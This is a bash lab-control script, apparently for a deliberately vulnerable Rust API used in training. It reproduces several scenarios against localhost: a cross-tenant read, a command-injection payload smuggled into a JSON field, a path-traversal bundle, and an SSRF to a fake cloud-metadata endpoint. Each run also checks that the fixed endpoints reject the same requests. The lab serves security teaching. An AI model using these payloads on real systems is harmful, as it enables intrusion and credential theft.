@@ -1,0 +1,154 @@
+#!/usr/bin/env bash
+set -euo pipefail
+
+ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
+cd "$ROOT"
+
+usage() {
+  cat <<'EOF'
+Usage: scripts/labctl COMMAND [SCENARIO]
+
+Commands:
+  doctor
+  verify-layout
+  run
+  run-dangerous
+  run-ssrf
+  stop-ssrf
+  test
+  fuzz
+  miri
+  loom
+  reproduce DVRA-001|DVRA-002|DVRA-003|DVRA-008|DVRA-009
+EOF
+}
+
+case "${1:-}" in
+  verify-layout)
+    exec python3 scripts/verify-layout.py
+    ;;
+  doctor)
+    command -v cargo >/dev/null && cargo --version || echo "cargo: missing"
+    command -v rustc >/dev/null && rustc --version || echo "rustc: missing"
+    command -v docker >/dev/null && docker --version || echo "docker: missing"
+    command -v curl >/dev/null && curl --version | head -1 || echo "curl: missing"
+    ;;
+  run)
+    exec cargo run -p dvra-api
+    ;;
+  run-dangerous)
+    echo "WARNING: starting deliberately dangerous command and filesystem endpoints" >&2
+    exec env DVRA_LAB_MODE=vulnerable DVRA_ACK_INSECURE=I_UNDERSTAND cargo run -p dvra-api
+    ;;
+  run-ssrf)
+    echo "WARNING: starting the SSRF lab with an internal fake metadata network and localhost-only API ingress" >&2
+    docker compose \
+      -f infrastructure/compose.yaml \
+      -f infrastructure/compose.ssrf.yaml \
+      --profile ssrf-lab up --build --detach
+    for _ in $(seq 1 60); do
+      if curl -fsS http://127.0.0.1:3000/health >/dev/null; then
+        echo "DVRA SSRF lab is ready on http://127.0.0.1:3000"
+        exit 0
+      fi
+      sleep 0.5
+    done
+    echo "DVRA API did not become ready; recent container logs follow" >&2
+    docker compose \
+      -f infrastructure/compose.yaml \
+      -f infrastructure/compose.ssrf.yaml \
+      --profile ssrf-lab logs --tail=50 >&2
+    exit 1
+    ;;
+  stop-ssrf)
+    exec docker compose \
+      -f infrastructure/compose.yaml \
+      -f infrastructure/compose.ssrf.yaml \
+      --profile ssrf-lab down --remove-orphans
+    ;;
+  test)
+    cargo test --workspace --locked
+    ;;
+  fuzz)
+    exec cargo fuzz run differential_parser
+    ;;
+  miri)
+    exec cargo +nightly miri test -p dvra-unsafe-cache miri_finds_panic_safety_bug -- --ignored
+    ;;
+  loom)
+    exec cargo test -p dvra-unsafe-cache --features loom-tests loom_detects_data_race --locked
+    ;;
+  reproduce)
+    case "${2:-}" in
+      DVRA-001)
+        echo "Vulnerable endpoint (blue tenant reads red artifact):"
+        curl -fsS -H 'x-tenant: blue' http://127.0.0.1:3000/v1/artifacts/2
+        echo
+        echo "Fixed endpoint (expected 404):"
+        curl -sS -o /dev/null -w '%{http_code}\n' -H 'x-tenant: blue' \
+          http://127.0.0.1:3000/v1/fixed/artifacts/2
+        ;;
+      DVRA-002)
+        echo "Requires the API to be running through run-dangerous." >&2
+        curl -fsS \
+          -H 'content-type: application/json' \
+          --data '{"artifact_name":"artifact; printf injected >/tmp/dvra-injected"}' \
+          http://127.0.0.1:3000/v1/post-process
+        echo
+        echo "The injected command writes only /tmp/dvra-injected in the lab runtime."
+        ;;
+      DVRA-003)
+        if python3 - <<'PYSEED' | curl -fsS --data-binary @- http://127.0.0.1:3000/v1/parse
+import sys
+sys.stdout.buffer.write(bytes.fromhex("445652410201021b000201aa"))
+PYSEED
+        then
+          echo "unexpected: vulnerable parser returned normally" >&2
+          exit 1
+        else
+          echo "expected: parser request failed after the seeded panic"
+        fi
+        ;;
+      DVRA-008)
+        fixture="scenarios/fixtures/DVRA-008-traversal.dvb"
+        escaped="/tmp/dvra/storage/other-job.txt"
+        rm -f "$escaped"
+        echo "Requires the API to be running through run-dangerous." >&2
+        curl -fsS --data-binary "@$fixture" http://127.0.0.1:3000/v1/bundles/8
+        echo
+        test -f "$escaped"
+        printf 'escaped file: '
+        cat "$escaped"
+        status="$(curl -sS -o /tmp/dvra-fixed-008.json -w '%{http_code}' \
+          --data-binary "@$fixture" http://127.0.0.1:3000/v1/fixed/bundles/8)"
+        test "$status" = "400"
+        echo "fixed endpoint rejected the same bundle with HTTP $status"
+        ;;
+      DVRA-009)
+        payload='{"url":"http://metadata:8081/redirect-to-credentials"}'
+        echo "Requires the API to be running through run-ssrf." >&2
+        response="$(curl -fsS \
+          -H 'content-type: application/json' \
+          --data "$payload" \
+          http://127.0.0.1:3000/v1/fetch)"
+        printf '%s\n' "$response"
+        grep -q 'DVRA_FAKE_METADATA_TOKEN' <<<"$response"
+        status="$(curl -sS -o /tmp/dvra-fixed-009.json -w '%{http_code}' \
+          -H 'content-type: application/json' \
+          --data "$payload" \
+          http://127.0.0.1:3000/v1/fixed/fetch)"
+        test "$status" = "403"
+        echo "fixed endpoint denied the metadata origin with HTTP $status"
+        ;;
+      *)
+        echo "unknown scenario" >&2
+        usage
+        exit 2
+        ;;
+    esac
+    ;;
+  *)
+    usage
+    exit 2
+    ;;
+esac
